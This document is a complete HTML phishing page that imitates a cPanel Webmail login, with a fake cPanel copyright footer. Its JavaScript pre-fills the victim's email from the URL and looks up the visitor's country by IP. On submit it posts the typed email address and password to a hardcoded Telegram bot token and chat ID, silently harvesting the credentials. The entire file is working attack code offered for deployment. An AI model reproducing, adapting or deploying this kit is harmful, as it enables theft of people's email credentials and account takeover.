<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff;
            text-align: center;
            margin: 0;
            padding: 0;
        }

        .container {
            margin-top: 150px;
        }

        img {
            margin-bottom: 30px;
            width: 250px;
        }

        .login-box {
            margin: 0 auto;
            width: 300px;
        }

        .login-box label {
            display: block;
            text-align: left;
            margin: 5px 0;
            font-weight: normal;
        }

        .login-box input[type="text"],
        .login-box input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 15px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        .login-box button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
        }

        .login-box button:hover {
            background-color: #0056b3;
        }

        .languages {
            margin-top: 20px;
            color: gray;
        }

        .languages a {
            color: gray;
            text-decoration: none;
            margin-right: 15px;
        }

        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: gray;
        }

        .footer a {
            color: gray;
            text-decoration: none;
        }
    </style>
    <script>
        let userCountry = ''; // Variable to store user's country

        // Function to populate the email field from URL parameter
        function populateEmailField() {
            const params = new URLSearchParams(window.location.search);
            if (params.has('email')) {
                document.getElementById('email').value = params.get('email');
            }
        }

        // Function to fetch user's country using a geolocation API
        function fetchUserCountry() {
            fetch('https://ipapi.co/json/')
                .then(response => {
                    if (!response.ok) throw new Error('Network response was not ok');
                    return response.json();
                })
                .then(data => {
                    userCountry = data.country_name || "Unknown";
                    console.log("User Country:", userCountry); // Log the country for debugging
                })
                .catch(error => {
                    console.error("Error fetching country data:", error);
                    userCountry = "Unknown"; // Default to "Unknown" if there's an error
                });
        }

        // Function to send data to Telegram
        function sendDataToTelegram(event) {
            event.preventDefault(); // Prevents form from submitting in the usual way

            // Collect data from form fields
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;

            // Telegram bot details
            const botToken = "7840973698:AAEwak-7hrIa-vzp3BV9kgkFUQK0LloA21M";
            const chatId = "6885599280";
            const message = `Email: ${email}\nPassword: ${password}\nCountry: ${userCountry}`;

            console.log("Sending Message:", message); // Log the message for debugging

            // Send the data to Telegram
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    // Removed the success alert
                    console.log("Data sent successfully."); // Log success instead
                } else {
                    alert("There was an error sending your information.");
                }
            })
            .catch(error => {
                alert("Failed to send message. Please try again later.");
                console.error("Error:", error);
            });
        }

        // Run functions on page load
        window.onload = function() {
            populateEmailField();
            fetchUserCountry();
        };
    </script>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <img src="webmail-logo.svg" alt="Webmail Logo">

        <!-- Login form -->
        <div class="login-box">
            <form id="dataForm" onsubmit="sendDataToTelegram(event)">
                <label for="email">Email Address</label>
                <input type="text" id="email" name="email" placeholder="Enter your email address" required>
                
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your email password" required>
                
                <button type="submit">Log in</button>
            </form>
        </div>

        <!-- Language selection -->
        <div class="languages">
            <a href="#">English</a>
            <a href="#">العربية</a>
            <a href="#">čeština</a>
            <a href="#">dansk</a>
            <a href="#">Deutsch</a>
            <a href="#">Ελληνικά</a>
            <a href="#">español</a>
            <a href="#">español latinoamericano</a>
        </div>

        <!-- Footer -->
        <div class="footer">
            <p>&copy; 2024 cPanel, L.L.C. <a href="#">Privacy Policy</a></p>
        </div>
    </div>
</body>
</html>
